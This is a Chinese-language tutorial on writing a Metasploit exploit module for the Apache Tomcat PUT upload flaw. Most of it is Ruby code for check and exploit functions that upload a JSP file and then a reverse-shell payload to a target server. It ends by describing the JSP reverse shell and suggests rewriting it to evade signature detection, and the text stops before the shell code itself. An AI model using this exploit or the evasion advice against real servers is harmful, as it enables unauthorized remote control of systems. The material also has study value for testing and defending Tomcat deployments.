TomcatPUT


TomcatPut是一个比较简单且经典的上传漏洞,支持直接使用put传递javaShell到目标服务器从而获取服务器控制权限。本文将会站在MSF模块漏洞利用的角度,编写模块上传并反弹回shell,来了解MSF基于web的漏洞利用和payload的生成,shellPayload的生成原理。


Msf的Exploit模块


exploit和auxiliary不同之处在于auxiliary的模块不含payload.所有exploit的模块必须有payload。

exploit的提供了check和exploit函数..分别用于漏洞检查和漏洞利用。

编写check函数


def check    #上传的路径名称    filePath=Rex::Text::rand_text_alpha(10);    # 生成的随机代码内容    javaCode= Rex::Text::rand_text_alpha(10);
     #尝试上传    res1 = send_request_cgi({      'uri'       => normalize_uri("/", "#{filePath}.jsp/"),#必须      'method'    => 'PUT',#必须       'data'      => "<% out.println("#{javaCode}");%>"#jsp内容    })
      #验证是否上传成功,请求路径查看javaCode是否被输出      res2 = send_request_cgi({        'uri'       => normalize_uri("/", "#{filePath}.jsp"),#必须        'method'    => 'GET'      })      puts "第二次验证请求服务器响应#{res2.body}" if res2      if res2 && res2.body.include?(javaCode)        #删除原来上传的内容        res3 = send_request_cgi({          'uri'       => normalize_uri("/", "#{filePath}.jsp"),#必须          'method'    => 'DELETE'        })        puts "已经删除上传的测试内容#{filePath}.jsp" if res3        #存在漏洞        return Exploit::CheckCode::Vulnerable      end        #没有漏洞        return Exploit::CheckCode::Safe
  end

check函数的返回值


check通过返回一个枚举告诉框架检查结果,如果不编写check父模块会自动返回 Exploit::CheckCode::Unsupported但表不支持check,还可以有如下值

序号
枚举值
含义
1
Exploit::CheckCode::Unknown模块由于超时等原因无法从目标计算机获取足够的信息用于判断
2Exploit::CheckCode::Safe

目标不受漏洞影响

3
Exploit::CheckCode::Detected目标正在运行所涉及的服务，但是检查无法确定目标是否易受攻击
4
Exploit::CheckCode::Appears如果漏洞是基于被动侦察确定的，则使用此方法。例如：版本，横幅广告，或仅拥有已知的易损资源
5
Exploit::CheckCode::Vulnerable目标受漏洞影响
6
Exploit::CheckCode::Unsupported检查方法不支持

编写exploit函数


def exploit    print_status "检查目标是否存在可利用漏洞"    resulte= check;#调用check函数    if resulte!=Exploit::CheckCode::Vulnerable      print_warning "漏洞不可用"      #当漏洞不可用时返回,job监听将会停掉      return resulte;    end    print_status "正在利用"    ranFilePath=Rex::Text::rand_text_alpha(10);             #尝试上传    res1 = send_request_cgi({      'uri'       => normalize_uri("/", "#{ranFilePath}.jsp/"),#必须      'method'    => 'PUT',#必须       'data'      => payload.encoded    })    #当payload上传成功后执行    res2 = send_request_cgi({      'uri'       => normalize_uri("/", "#{ranFilePath}.jsp"),#必须      'method'    => 'GET'    })    if res2 && res2.code==200      print_good "payload执行成功"    else      print_good "payload执行失败"          end   end

成品jspshell


大概内容就是jsp为一个构造对象,在访问的时候触发构造函数。然后启动线程启动bash,读取进程输入输出流,然后和主动和远程接收机创建socket,并连接socket和进程输出输入流。这个代码是完全可以自修改的,为了绕过一些特征检测可以直接修改或者重写jsp_reverse_tcp函数。这个就看java基础了,自由发挥：
